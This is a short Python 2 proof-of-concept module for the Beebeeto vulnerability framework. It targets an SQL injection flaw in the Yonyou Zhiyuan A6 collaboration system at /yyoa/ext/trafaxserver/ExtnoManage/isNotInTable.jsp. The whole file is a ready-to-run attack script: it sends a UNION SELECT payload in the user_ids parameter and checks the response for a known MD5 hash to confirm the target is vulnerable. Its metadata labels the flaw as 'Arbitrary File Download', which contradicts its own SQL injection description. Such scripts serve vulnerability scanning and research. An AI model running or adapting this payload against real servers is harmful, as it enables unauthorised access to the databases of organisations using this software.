#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        'poc':{
            'id':'poc-2015-0133',
            'name':'用友致远A6协同系统 /isNotInTable.jsp SQL Injection PoC',
            'author':'Sevsea',
            'create_date':'2015-08-27',
        },
        'protocol':{
            'name':'http',
            'port':'80',
            'layer4_protocol':['tcp'],
        },
        'vul':{
            'app_name':'用友',
            'vul_version':['*'],
            'type': 'Arbitrary File Download',
            'tag': ['用友SQL注入漏洞', '/ext/trafaxserver/ExtnoManage/isNotInTable.jsp 漏洞', 'jsp'],
            'desc': '用友 mysql+jsp 注射',
            'references': ['http://wooyun.org/bugs/wooyun-2010-0110312'],
        },
    }


    @classmethod
    def verify(cls,args):
        url = args['options']['target']
        verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
                    '(17) union all select md5(3.1415)#') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run(debug=True))